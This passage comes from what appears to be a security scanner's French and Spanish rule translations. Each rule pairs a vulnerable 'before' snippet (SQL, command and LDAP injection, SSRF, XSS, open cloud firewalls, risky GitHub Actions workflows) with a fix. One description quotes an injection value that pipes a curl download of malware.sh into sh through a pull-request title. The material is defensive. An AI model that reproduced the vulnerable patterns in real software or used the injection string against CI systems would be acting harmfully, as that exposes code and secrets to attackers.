    title: "Contraseñas o datos sensibles terminan en los logs",
    description:
      "Una llamada a console.log (o similar) incluye una variable llamada password, token, secret o apiKey. Si estos logs terminan en un servicio externo o en un archivo, los datos sensibles quedan expuestos mucho más tiempo del necesario.",
    fix: {
      before: `console.log("login attempt", { email, password })`,
      after: `console.log("login attempt", { email })`,
    },
  },
  "docker-unpinned-base-image": {
    title: 'La imagen base del Dockerfile usa la etiqueta ":latest"',
    description:
      'Una instrucción FROM usa explícitamente la etiqueta ":latest" en vez de una versión precisa. "latest" cambia con el tiempo: la misma build, rehecha en otro momento, puede obtener una versión distinta de la imagen base — una build no reproducible, y una actualización no deseada puede llegar sin que nadie haya decidido que así fuera.',
    fix: {
      before: `FROM node:latest`,
      after: `FROM node:20.11-slim`,
    },
  },
  "docker-add-remote-url": {
    title: "El Dockerfile descarga un archivo remoto con ADD en vez de COPY",
    description:
      "Una instrucción ADD con una URL http/https descarga un archivo de internet durante la build, sin comprobación de integridad y con el contenido invisible en el repositorio. Si esa URL se ve comprometida en el futuro, la build incorpora contenido arbitrario sin que nadie se dé cuenta con solo leer el Dockerfile.",
    fix: {
      before: `ADD https://example.com/install.sh /tmp/install.sh`,
      after: `RUN curl -fsSL https://example.com/install.sh -o /tmp/install.sh \\\n    && echo "<hash esperado>  /tmp/install.sh" | sha256sum -c -`,
    },
  },
  "vulnerable-dependency": (original) => ({
    title: original.title.replace("Dipendenza vulnerabile:", "Dependencia vulnerable:"),
    description: original.description,
    fix: {
      before: original.fix.before,
      after: original.fix.after.replace(
        "Nessuna versione corretta nota ancora — valuta un pacchetto alternativo o segui gli aggiornamenti del progetto.",
        "Todavía no se conoce ninguna versión corregida — valora un paquete alternativo o sigue las actualizaciones del proyecto."
      ),
    },
  }),
},
  fr: {
  "supabase-service-role-in-client": {
    title: "La clé secrète de Supabase se retrouve dans une partie exposée au navigateur",
    description:
      "Une variable avec un préfixe public (ex. NEXT_PUBLIC_, VITE_) ou un fichier côté client référence la service role key de Supabase. Cette clé contourne la Row Level Security : si elle se retrouve dans le bundle du navigateur, n'importe qui peut la lire et agir comme administrateur de la base de données.",
    fix: {
      before: `// components/Dashboard.tsx\nconst supabase = createClient(url, process.env.NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY)`,
      after: `// app/api/admin/route.ts (serveur uniquement)\nconst supabase = createClient(url, process.env.SUPABASE_SERVICE_ROLE_KEY)`,
    },
  },
  "hardcoded-secret": {
    title: "Des mots de passe ou des clés secrètes sont écrits directement dans le code",
    description:
      "Une clé API, un token ou un mot de passe semblent écrits comme valeur littérale au lieu d'être lus depuis une variable d'environnement. Quiconque lit le code source (ou le dépôt, s'il est public) récupère ce secret.",
    fix: {
      before: `const apiKey = "sk_live_51H8x9K2eZvKYlo2C..."`,
      after: `const apiKey = process.env.STRIPE_SECRET_KEY`,
    },
  },
  "env-file-with-real-values": {
    title: "Un fichier contenant les vrais mots de passe du projet fait partie des fichiers analysés",
    description:
      "Un fichier .env avec des valeurs réelles (pas un .env.example) est inclus dans l'analyse. Si ce fichier se retrouve dans un dépôt ou un déploiement public, toutes les informations d'identification qu'il contient sont exposées.",
    fix: {
      before: `# .env (committé par erreur)\nDATABASE_URL=postgres://user:realpassword@db.host/prod`,
      after: `# .env.example (committé)\nDATABASE_URL=postgres://user:password@localhost/dev\n\n# .env reste hors du dépôt (.gitignore)`,
    },
  },
  "missing-row-level-security": {
    title: "N'importe qui peut lire ou modifier les données de tous les utilisateurs",
    description:
      "La Row Level Security est désactivée, ou une policy autorise l'accès à tout le monde (USING (true)) sans vérifier qui fait la demande. Chaque utilisateur authentifié — ou même anonyme — peut lire ou modifier les données de tous les autres.",
    fix: {
      before: `ALTER TABLE public.orders DISABLE ROW LEVEL SECURITY;`,
      after: `ALTER TABLE public.orders ENABLE ROW LEVEL SECURITY;\nCREATE POLICY "owners only" ON public.orders\n  USING (auth.uid() = user_id);`,
    },
  },
  "sql-injection": {
    title: "Une valeur saisie par l'utilisateur est collée directement dans une requête à la base de données",
    description:
      "Une requête SQL est construite en concaténant ou en interpolant directement une chaîne au lieu d'utiliser des paramètres. Si ce texte provient (même indirectement) d'un utilisateur, il peut altérer la requête elle-même — injection SQL.",
    fix: {
      before: "db.query(`SELECT * FROM users WHERE email = '${email}'`)",
      after: `db.query("SELECT * FROM users WHERE email = $1", [email])`,
    },
  },
  "plaintext-password-storage": {
    title: "Les mots de passe ne semblent pas être protégés",
    description:
      "Un champ mot de passe est enregistré exactement tel qu'il est arrivé dans la requête, et aucune fonction de hachage (bcrypt, argon2, scrypt) n'apparaît dans le fichier. Si la base de données est compromise, chaque mot de passe est immédiatement utilisable.",
    fix: {
      before: `await db.users.insert({ email, password: req.body.password })`,
      after: `const hashed = await bcrypt.hash(req.body.password, 12)\nawait db.users.insert({ email, password: hashed })`,
    },
  },
  "hardcoded-jwt-secret": {
    title: "Le secret utilisé pour signer les connexions est écrit en clair dans le code",
    description:
      "Le secret passé à jwt.sign / jwt.verify (ou la variable JWT_SECRET) est une valeur littérale dans le code au lieu de provenir d'une variable d'environnement. Quiconque le lit peut créer des tokens d'accès valides pour n'importe quel utilisateur.",
    fix: {
      before: `jwt.sign(payload, "super-secret-key-123")`,
      after: `jwt.sign(payload, process.env.JWT_SECRET)`,
    },
  },
  "command-injection": {
    title: "Le serveur peut être forcé à exécuter des commandes externes",
    description:
      "Une fonction qui exécute des commandes système (exec, execSync, spawn) reçoit une chaîne construite par interpolation ou concaténation. Si une partie de cette chaîne provient d'une saisie utilisateur, quiconque la contrôle peut exécuter des commandes arbitraires sur le serveur.",
    fix: {
      before: "execSync(`convert ${filename} output.png`)",
      after: `execFile("convert", [filename, "output.png"])`,
    },
  },
  "unprotected-new-table": {
    title: "Une nouvelle table semble être créée sans protection",
    description:
      "Une migration SQL crée une table mais n'active pas la Row Level Security pour cette même table dans le même fichier. Tant que cela reste ainsi, la table démarre sans aucune restriction sur qui peut la lire ou y écrire.",
    fix: {
      before: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);`,
      after: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);\nALTER TABLE public.invoices ENABLE ROW LEVEL SECURITY;`,
    },
  },
  "permissive-cors": {
    title: "Le site accepte les requêtes depuis n'importe quel autre site",
    description:
      "L'en-tête CORS est configuré pour accepter les requêtes depuis n'importe quelle origine (*), ou le middleware cors() est utilisé sans restriction. N'importe quel site tiers peut appeler vos API depuis le navigateur d'un utilisateur déjà authentifié.",
    fix: {
      before: `app.use(cors())`,
      after: `app.use(cors({ origin: ["https://yoursite.com"] }))`,
    },
  },
  "admin-function-missing-auth": {
    title: "Une fonction avec des permissions d'administrateur ne vérifie pas qui l'utilise",
    description:
      "Une route ou une fonction dont le nom suggère des opérations d'administration ne contient, dans les lignes voisines, aucune vérification d'authentification ou de rôle. N'importe qui connaissant l'URL pourrait l'exécuter.",
    fix: {
      before: `router.post("/admin/delete-user", async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
      after: `router.post("/admin/delete-user", requireAuth, requireRole("admin"), async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
    },
  },
  ssrf: {
    title: "Le site peut être forcé à exécuter du code externe",
    description:
      "Une requête HTTP sortante (fetch, axios) utilise directement une valeur provenant de la requête d'un utilisateur comme URL de destination. Un utilisateur malveillant peut forcer votre serveur à appeler des adresses internes ou arbitraires — Server-Side Request Forgery.",
    fix: {
      before: `const data = await fetch(req.query.url)`,
      after: `const ALLOWED = new Set(["https://api.yourservice.com"])\nif (!ALLOWED.has(req.query.url)) throw new Error("URL not allowed")\nconst data = await fetch(req.query.url)`,
    },
  },
  "weak-password-hashing": {
    title: "Les mots de passe sont protégés par une méthode désormais facile à casser",
    description:
      "Sur la même ligne, md5() ou sha1() sont appliqués à une valeur liée à un mot de passe. Ces algorithmes sont trop rapides à calculer : un attaquant disposant de la base de données peut essayer des milliards de mots de passe par seconde.",
    fix: {
      before: `const hashed = crypto.createHash("md5").update(password).digest("hex")`,
      after: `const hashed = await bcrypt.hash(password, 12)`,
    },
  },
  "xss-dangerous-html": {
    title: "Un texte écrit par les utilisateurs pourrait exécuter du code dans le navigateur",
    description:
      "Du contenu est inséré dans la page en tant que HTML brut (dangerouslySetInnerHTML, v-html, .innerHTML) au lieu de texte brut. Si ce contenu inclut une saisie utilisateur, il peut contenir des scripts qui s'exécutent dans le navigateur de celui qui lit la page.",
    fix: {
      before: `<div dangerouslySetInnerHTML={{ __html: comment.text }} />`,
      after: `<div>{comment.text}</div>\n// ou, si du HTML est nécessaire : DOMPurify.sanitize(comment.text)`,
    },
  },
  "public-storage-bucket": {
    title: "L'espace de stockage des fichiers envoyés est visible par tout le monde",
    description:
      "Un bucket de stockage (Supabase Storage, S3) est configuré comme public. S'il contient des documents, des photos ou des fichiers envoyés par les utilisateurs, quiconque connaît — ou devine — le chemin peut y accéder sans authentification.",
    fix: {
      before: `supabase.storage.createBucket("uploads", { public: true })`,
      after: `supabase.storage.createBucket("uploads", { public: false })\n// servir les fichiers avec des URLs signées à durée limitée : createSignedUrl(path, 60)`,
    },
  },
  "csrf-state-changing-get": {
    title: "Un simple lien suffit pour supprimer ou modifier des données",
    description:
      "Une route GET effectue une opération qui modifie des données (le chemin contient delete/remove/update/edit). Les requêtes GET s'exécutent juste en visitant un lien ou en chargeant une image depuis un site externe — le tremplin classique d'une attaque CSRF.",
    fix: {
      before: `router.get("/posts/:id/delete", deletePost)`,
      after: `router.post("/posts/:id/delete", requireAuth, csrfProtection, deletePost)`,
    },
  },
  "insecure-token-storage": {
    title: "Les données de connexion enregistrées dans le navigateur ne sont pas bien protégées",
    description:
      "Un token d'accès est enregistré dans localStorage. Contrairement à un cookie httpOnly, n'importe quel script exécuté sur la page (y compris un script malveillant injecté via XSS) peut le lire et le voler.",
    fix: {
      before: `localStorage.setItem("authToken", token)`,
      after: `// définir le token comme cookie httpOnly depuis le serveur :\nres.cookie("authToken", token, { httpOnly: true, secure: true, sameSite: "strict" })`,
    },
  },
  "open-redirect": {
    title: "Le site peut être utilisé pour rediriger vers un site frauduleux",
    description:
      "Le site redirige l'utilisateur vers une adresse prise directement dans la requête (query, body, params) sans vérifier qu'il s'agit d'un domaine connu. Un lien qui semble pointer vers votre site peut en réalité mener vers une page de phishing.",
    fix: {
      before: `res.redirect(req.query.next)`,
      after: `const ALLOWED = new Set(["/dashboard", "/profile"])\nres.redirect(ALLOWED.has(req.query.next) ? req.query.next : "/dashboard")`,
    },
  },
  idor: {
    title: "Changer un numéro dans l'adresse pourrait afficher les données de quelqu'un d'autre",
    description:
      "Une requête à la base de données utilise directement un identifiant pris dans l'URL (req.params.id) sans vérifier, dans les lignes voisines, qu'il appartient à l'utilisateur effectuant la requête. Changer l'id dans l'adresse pourrait donner accès aux données d'un autre utilisateur — Insecure Direct Object Reference.",
    fix: {
      before: `const order = await Order.findById(req.params.id)`,
      after: `const order = await Order.findOne({ _id: req.params.id, userId: req.user.id })`,
    },
  },
  "no-login-rate-limit": {
    title: "Le formulaire de connexion ne bloque pas trop de tentatives d'affilée",
    description:
      "Une route de connexion est définie dans le fichier, mais aucune trace d'un middleware de limitation de débit dans le même fichier. Sans limite sur les tentatives, un attaquant peut essayer des mots de passe en séquence (force brute) sans être ralenti.",
    fix: {
      before: `router.post("/login", loginHandler)`,
      after: `import rateLimit from "express-rate-limit"\nconst loginLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 5 })\nrouter.post("/login", loginLimiter, loginHandler)`,
    },
  },
  "sensitive-data-in-logs": {
    title: "Des mots de passe ou des données sensibles se retrouvent dans les logs",
    description:
      "Un appel à console.log (ou similaire) inclut une variable nommée password, token, secret ou apiKey. Si ces logs se retrouvent dans un service externe ou un fichier, les données sensibles restent exposées bien plus longtemps que nécessaire.",
    fix: {
      before: `console.log("login attempt", { email, password })`,
      after: `console.log("login attempt", { email })`,
    },
  },
  "path-traversal": {
    title: "Un fichier sur le serveur peut être lu ou écrit en choisissant le chemin depuis l'extérieur",
    description:
      "Une fonction qui lit, écrit ou envoie un fichier reçoit le chemin directement depuis une valeur de la requête (query, body, params) sans vérifier qu'il reste dans un dossier autorisé. Un attaquant peut insérer \"../\" pour sortir du dossier prévu et lire ou écraser des fichiers arbitraires sur le serveur (ex. un fichier de configuration contenant des identifiants).",
    fix: {
      before: `app.get("/download", (req, res) => {\n  res.sendFile(req.query.file)\n})`,
      after: `const ALLOWED_DIR = path.resolve("./uploads")\napp.get("/download", (req, res) => {\n  const target = path.resolve(ALLOWED_DIR, req.query.file)\n  if (!target.startsWith(ALLOWED_DIR)) return res.status(400).send("Chemin non autorisé")\n  res.sendFile(target)\n})`,
    },
  },
  "nosql-injection": {
    title: "Une valeur saisie par l'utilisateur est exécutée comme du code dans une requête MongoDB",
    description:
      "L'opérateur $where de MongoDB exécute du JavaScript côté serveur pour chaque document — si cette chaîne est construite en concaténant une valeur provenant de l'utilisateur, celui qui la contrôle peut faire exécuter du code arbitraire dans le contexte de la base de données, pas seulement altérer le filtre comme avec une injection SQL classique.",
    fix: {
      before: `db.collection.find({ $where: "this.username == '" + username + "'" })`,
      after: `db.collection.find({ username: username })`,
    },
  },
  ssti: {
    title: "Une valeur saisie par l'utilisateur est interprétée comme un template, pas comme une donnée",
    description:
      "Une fonction qui compile/exécute un template reçoit le template ENTIER depuis une valeur de la requête, au lieu d'utiliser un template fixe et de ne passer que les données. Un attaquant peut écrire directement dans la syntaxe du moteur de template (ex. {{7*7}} pour Jinja2) et exécuter du code sur le serveur — Server-Side Template Injection, qui mène souvent à l'exécution de commandes arbitraires, pas seulement à un problème d'affichage comme le XSS.",
    fix: {
      before: `return render_template_string(request.args.get("name"))`,
      after: `return render_template("profile.html", name=request.args.get("name"))`,
    },
  },
  xxe: {
    title: "L'analyseur XML peut être forcé à lire des fichiers ou à effectuer des requêtes externes",
    description:
      "Un analyseur XML (DocumentBuilderFactory) est créé sans désactiver explicitement les entités externes (DOCTYPE) dans les lignes voisines. Si l'analyseur reçoit du XML provenant d'une source non fiable, un attaquant peut définir une entité externe pour lire des fichiers sur le serveur ou le forcer à contacter une adresse de son choix — XML External Entity.",
    fix: {
      before: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nDocumentBuilder builder = factory.newDocumentBuilder();`,
      after: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nfactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);\nDocumentBuilder builder = factory.newDocumentBuilder();`,
    },
  },
  "terraform-open-security-group": {
    title: "Un security group Terraform ouvre un port sensible à tout internet",
    description:
      "Une règle avec \"cidr_blocks\" incluant 0.0.0.0/0 (n'importe quelle adresse IP) est proche d'un port sensible — SSH (22), RDP (3389), ou un port de base de données typique (MySQL, Postgres, MongoDB, Redis, SQL Server). N'importe qui sur internet peut essayer de se connecter à ce service, pas seulement qui le devrait.",
    fix: {
      before: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["0.0.0.0/0"]\n}`,
      after: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["10.0.0.0/16"]  # seulement votre réseau privé, ou un bastion host\n}`,
    },
  },
  "gcp-firewall-open-to-internet": {
    title: "Une règle de pare-feu Google Cloud ouvre un port sensible à tout internet",
    description:
      "Une ressource \"google_compute_firewall\" avec \"source_ranges\" incluant 0.0.0.0/0 (n'importe quelle adresse IP) autorise le trafic vers un port sensible — SSH (22), RDP (3389), ou un port de base de données typique (MySQL, Postgres, MongoDB, Redis, SQL Server). N'importe qui sur internet peut essayer de se connecter à ce service, pas seulement qui le devrait.",
    fix: {
      before: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["0.0.0.0/0"]\n}`,
      after: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["10.0.0.0/16"]  # seulement votre réseau privé, ou un bastion host\n}`,
    },
  },
  "azure-nsg-open-to-internet": {
    title: "Une règle réseau Azure ouvre un port sensible à tout internet",
    description:
      "Une règle de sécurité réseau (\"azurerm_network_security_rule\", ou un bloc \"security_rule\" à l'intérieur de \"azurerm_network_security_group\") avec \"source_address_prefix\" à \"*\" ou \"0.0.0.0/0\", direction \"Inbound\" et accès \"Allow\", proche d'un port sensible — SSH (22), RDP (3389), ou un port de base de données typique. N'importe qui sur internet peut essayer de se connecter à ce service, pas seulement qui le devrait.",
    fix: {
      before: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "*"\n}`,
      after: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "10.0.0.0/16"  # seulement votre réseau privé, ou un bastion host\n}`,
    },
  },
  "terraform-hardcoded-secret": {
    title: "Un secret est écrit comme valeur par défaut d'une variable Terraform",
    description:
      "Une variable avec un nom du type password/secret/token/key a une valeur littérale dans son \"default\". Contrairement à une valeur passée à l'exécution (tfvars, variables d'environnement TF_VAR_*), une valeur par défaut se retrouve dans le code source — et si le dépôt est partagé ou public, n'importe qui la voit, même sans accès à l'état Terraform.",
    fix: {
      before: `variable "db_password" {\n  default = "supersecret123"\n}`,
      after: `variable "db_password" {\n  # pas de valeur par défaut : à passer via un fichier .tfvars (hors de git) ou une variable d'environnement TF_VAR_db_password\n  sensitive = true\n}`,
    },
  },
  "gha-script-injection": {
    title: "Une valeur contrôlée par un utilisateur externe entre directement dans une commande shell de la CI",
    description:
      'Une commande "run:" d\'un workflow GitHub Actions interpole directement une valeur comme le titre d\'une pull request, le nom d\'une branche ou le texte d\'un commentaire — toutes modifiables par quiconque ouvre une pull request ou un commentaire, même depuis un fork externe. Une valeur comme `"; curl malware.sh | sh #` exécuterait des commandes arbitraires dans la CI, avec accès à tous les secrets disponibles dans ce workflow.',
    fix: {
      before: `- run: echo "\${{ github.event.pull_request.title }}"`,
      after: `- env:\n    PR_TITLE: \${{ github.event.pull_request.title }}\n  run: echo "$PR_TITLE"  # passé comme variable d'environnement, jamais interpolé directement dans la commande`,
    },
  },
  "gha-pull-request-target-checkout": {
    title: "Le workflow exécute le code d'une pull request externe avec accès aux secrets du dépôt",
    description:
      'Le workflow utilise "pull_request_target" — qui s\'exécute avec les permissions et les secrets du dépôt de base même pour une pull request ouverte depuis un fork externe — et fait le checkout du code de la pull request elle-même ("github.event.pull_request.head"), pas de la branche de base. Celui qui ouvre la pull request obtient de fait l\'exécution de son propre code avec accès à ces secrets.',
    fix: {
      before: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: \${{ github.event.pull_request.head.sha }}`,
      after: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      # Fait le checkout de la branche de base, pas du code de la PR — ou\n      # utilisez "pull_request" au lieu de "pull_request_target" si vous\n      # n'avez pas besoin des permissions/secrets plus larges.\n      - uses: actions/checkout@v4`,
    },
  },
  "insecure-deserialization": {
    title: "Les données de la requête sont désérialisées avec un format pouvant exécuter du code",
    description:
      "pickle (Python), unserialize() (PHP), ObjectInputStream (Java) ou la bibliothèque node-serialize (Node) désérialisent une valeur prise directement dans la requête. Contrairement à JSON, ces formats peuvent représenter et exécuter du code pendant la désérialisation elle-même — celui qui contrôle la valeur envoyée peut obtenir l'exécution de code arbitraire sur le serveur.",
    fix: {
      before: `data = pickle.loads(request.data)`,
      after: `import json\ndata = json.loads(request.data)  # JSON n'exécute jamais de code lors du parsing, contrairement à pickle`,
    },
  },
  "jwt-none-algorithm": {
    title: 'Le code accepte explicitement des tokens JWT non signés (algorithme "none")',
    description:
      '"none" figure parmi les algorithmes acceptés pour vérifier un token JWT. Un token avec l\'algorithme "none" n\'a aucune signature à vérifier : n\'importe qui peut en construire un avec n\'importe quel contenu (ex. un rôle administrateur) et le code l\'accepterait comme valide.',
    fix: {
      before: `jwt.verify(token, secret, { algorithms: ["HS256", "none"] })`,
      after: `jwt.verify(token, secret, { algorithms: ["HS256"] })  // ne jamais inclure "none" parmi les algorithmes acceptés`,
    },
  },
  "terraform-s3-block-public-access-disabled": {
    title: "Block Public Access est désactivé sur un bucket S3 défini en Terraform",
    description:
      'Une ou plusieurs des quatre protections de "aws_s3_bucket_public_access_block" (block_public_acls, ignore_public_acls, block_public_policy, restrict_public_buckets) sont réglées sur false. Cela ne signifie pas que le bucket est déjà public, mais cela retire un filet de sécurité qui empêcherait de le rendre public par erreur plus tard.',
    fix: {
      before: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls = false\n}`,
      after: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls       = true\n  ignore_public_acls      = true\n  block_public_policy     = true\n  restrict_public_buckets = true\n}`,
    },
  },
  "terraform-iam-wildcard-policy": {
    title: "Une policy IAM définie en Terraform accorde un accès complet",
    description:
      'Un statement avec action "*" et resource "*" accorde un accès complet à chaque service et ressource AWS — la même vérification déjà faite sur l\'état IAM en direct, ici lue directement depuis le code avant même d\'être appliquée. Cela peut être voulu pour un rôle d\'urgence, mais cela doit être confirmé : pour un usage quotidien, n\'accordez que les permissions réellement nécessaires.',
    fix: {
      before: `statement {\n  effect    = "Allow"\n  actions   = ["*"]\n  resources = ["*"]\n}`,
      after: `statement {\n  effect    = "Allow"\n  actions   = ["s3:GetObject"]\n  resources = ["arn:aws:s3:::votre-bucket/*"]\n}`,
    },
  },
  "gcp-storage-bucket-public": {
    title: "Un bucket Google Cloud Storage est rendu lisible par n'importe qui",
    description:
      'Une ressource "google_storage_bucket_iam_member" ou "google_storage_bucket_iam_binding" accorde un rôle à "allUsers" ou "allAuthenticatedUsers" — le premier rend le bucket lisible par n\'importe qui sur internet, même sans compte Google ; le second par quiconque possède un compte Google, pas seulement qui devrait y avoir accès.',
    fix: {
      before: `resource "google_storage_bucket_iam_member" "public" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "allUsers"\n}`,
      after: `resource "google_storage_bucket_iam_member" "example" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "user:quelquun@example.com"  # seulement qui doit vraiment y avoir accès, pas allUsers/allAuthenticatedUsers\n}`,
    },
  },
  "azure-storage-public-access": {
    title: "L'accès public aux blobs est activé sur un compte de stockage Azure",
    description:
      '"allow_blob_public_access" est réglé sur true sur un "azurerm_storage_account" : quiconque connaît l\'URL d\'un blob/conteneur rendu public peut le lire, sans aucune authentification.',
    fix: {
      before: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = true\n}`,
      after: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = false\n}`,
    },
  },
  "gcp-iam-overly-broad-role": {
    title: "Un rôle IAM Google Cloud accorde un accès complet (Owner/Editor)",
    description:
      'Un "google_project_iam_binding"/"google_project_iam_member" (ou l\'équivalent au niveau organisation/dossier) attribue le rôle primitif "roles/owner" ou "roles/editor" — un accès quasi complet à chaque service du projet. Cela peut être voulu pour un compte d\'urgence, mais cela doit être confirmé : pour un usage quotidien, n\'accordez que les rôles prédéfinis plus spécifiques réellement nécessaires.',
    fix: {
      before: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/owner"\n  member  = "user:dev@example.com"\n}`,
      after: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/storage.admin"  # seulement le rôle prédéfini réellement nécessaire, pas roles/owner\n  member  = "user:dev@example.com"\n}`,
    },
  },
  "azure-role-assignment-owner": {
    title: "Une attribution de rôle Azure accorde un accès complet (Owner)",
    description:
      'Un "azurerm_role_assignment" attribue le rôle "Owner" — un accès complet, y compris le contrôle sur les permissions des autres utilisateurs, sur toute la portée assignée (abonnement, groupe de ressources...). Cela peut être voulu pour un compte d\'urgence, mais cela doit être confirmé : pour un usage quotidien, n\'accordez que le rôle le plus spécifique réellement nécessaire (ex. "Contributor" sur un seul groupe de ressources).',
    fix: {
      before: `resource "azurerm_role_assignment" "example" {\n  scope                = data.azurerm_subscription.primary.id\n  role_definition_name = "Owner"\n}`,
      after: `resource "azurerm_role_assignment" "example" {\n  scope                = azurerm_resource_group.example.id\n  role_definition_name = "Contributor"  # seulement le rôle le plus spécifique réellement nécessaire, pas Owner sur tout l'abonnement\n}`,
    },
  },
  "weak-random-token": {
    title: "Un token de sécurité est généré avec un générateur de nombres aléatoires non sécurisé",
    description:
      "Une valeur avec un nom du type token/session/reset/otp/csrf est générée avec Math.random() (JS), random.random() (Python) ou rand() (PHP) — des générateurs non conçus pour la sécurité, dont les séquences sont prévisibles. Un token généré ainsi peut être deviné ou reconstruit, annulant l'objectif pour lequel il existe (ex. un lien de réinitialisation de mot de passe que n'importe qui pourrait prédire).",
    fix: {
      before: `const resetToken = Math.random().toString(36).slice(2);`,
      after: `const resetToken = crypto.randomBytes(32).toString("hex"); // crypto, pas Math.random — imprévisible`,
    },
  },
  "ldap-injection": {
    title: "Un filtre LDAP est construit en concaténant directement une valeur de la requête",
    description:
      'Une ligne qui construit un filtre LDAP (ex. "(uid=...)") inclut directement une valeur prise dans la requête, sans aucun échappement des caractères spéciaux LDAP. Celui qui contrôle cette valeur peut altérer la logique du filtre — par exemple contourner une vérification d\'authentification ou lire des données de l\'annuaire qu\'il ne devrait pas voir.',
    fix: {
      before: `const filter = \`(uid=\${req.body.username})\`;\nclient.search(base, { filter });`,
      after: `const filter = \`(uid=\${ldapEscape(req.body.username)})\`; // les caractères spéciaux LDAP doivent toujours être échappés avant de les utiliser dans un filtre\nclient.search(base, { filter });`,
    },
  },
  "header-injection": {
    title: "Une valeur de la requête se retrouve directement dans un en-tête de réponse HTTP",
    description:
      "Un en-tête de réponse HTTP est défini avec une valeur prise directement dans la requête (query, body, params), sans vérifier qu'elle ne contient pas de retour à la ligne (CRLF). Un attaquant peut insérer des en-têtes supplémentaires ou même une réponse entièrement différente — response splitting — pouvant manipuler le cache, les cookies ou le contenu affiché à d'autres utilisateurs.",
    fix: {
      before: `res.setHeader("X-Redirect-Reason", req.query.reason)`,
      after: `const ALLOWED_REASONS = new Set(["expired", "manual"])\nres.setHeader("X-Redirect-Reason", ALLOWED_REASONS.has(req.query.reason) ? req.query.reason : "unknown")`,
    },
  },
  "gha-unpinned-action": {
    title: "Une action tierce dans la CI n'est pas verrouillée sur une version précise (commit SHA)",
    description:
      'Le workflow utilise une action tierce référencée par tag ou branche (ex. "@v1", "@main") au lieu d\'un commit SHA. Celui qui la maintient — ou celui qui compromet son compte — peut déplacer cette référence vers un commit différent à tout moment, changeant silencieusement ce qui s\'exécute dans la CI, avec accès à ses secrets. Un commit SHA pointe toujours vers exactement le même code.',
    fix: {
      before: `uses: some-org/some-action@v1`,
      after: `uses: some-org/some-action@a1b2c3d4e5f6...  # v1, verrouillée sur le commit SHA — mettez à jour le SHA quand vous mettez à jour la version`,
    },
  },
  "gha-excessive-permissions": {
    title: "Le workflow s'accorde toutes les permissions du token au lieu de seulement celles qu'il utilise",
    description:
      '"permissions: write-all" accorde au GITHUB_TOKEN du workflow un accès en écriture à tout — issues, pull requests, packages, déploiements — même si le workflow n\'en utilise qu\'une partie. Si une étape du workflow est compromise (une dépendance malveillante, un script injecté), ces permissions plus larges augmentent ce que celui qui l\'exploite peut faire.',
    fix: {
      before: `permissions: write-all`,
      after: `permissions:\n  contents: read\n  pull-requests: write  # seulement les permissions réellement utilisées par le workflow`,
    },
  },
  "insecure-cookie-flags": {
    title: "Un cookie de session ou d'authentification est défini sans les flags Secure et HttpOnly",
    description:
      'Un cookie avec un nom ressemblant à session/auth/token est défini sans "httpOnly" ni "secure" parmi ses options. Sans httpOnly, le JavaScript de la page — y compris du code injecté via XSS — peut lire ce cookie. Sans secure, il peut aussi être envoyé sur une connexion HTTP non chiffrée.',
    fix: {
      before: `res.cookie("session", sessionId)`,
      after: `res.cookie("session", sessionId, { httpOnly: true, secure: true, sameSite: "strict" })`,
    },
  },
  "docker-hardcoded-secret": {
    title: "Un secret est écrit directement dans une instruction ENV ou ARG du Dockerfile",
    description:
      "Une variable avec un nom du type password/secret/token/key a une valeur littérale dans une instruction ENV ou ARG. Contrairement à un fichier .env (qui ne se retrouve normalement pas dans l'image), cette valeur est gravée dans l'image Docker elle-même — quiconque peut la récupérer (pull) ou inspecter l'historique des layers peut la retrouver, même si la ligne est supprimée dans une version ultérieure du Dockerfile.",
    fix: {
      before: `ENV DB_PASSWORD=supersecret123`,
      after: `ARG DB_PASSWORD\nENV DB_PASSWORD=$DB_PASSWORD\n# passé avec : docker build --build-arg DB_PASSWORD=*** (ou, mieux encore,\n# un montage de secret BuildKit, qui ne se retrouve jamais dans l'historique des layers)`,
    },
  },
  "docker-missing-user": {
    title: "Le Dockerfile ne définit pas d'utilisateur non-root",
    description:
      "Aucune instruction USER dans le Dockerfile : sans cela, le conteneur s'exécute en tant que root. Si un attaquant parvient à exécuter du code dans le conteneur (ex. en exploitant une bibliothèque vulnérable), être root dans le conteneur facilite une évasion vers l'hôte — ou un impact plus large sur le système environnant.",
    fix: {
      before: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nCMD ["node", "server.js"]`,
      after: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nUSER node\nCMD ["node", "server.js"]`,
    },
  },
  "docker-unpinned-base-image": {
    title: 'L\'image de base du Dockerfile utilise le tag ":latest"',
    description:
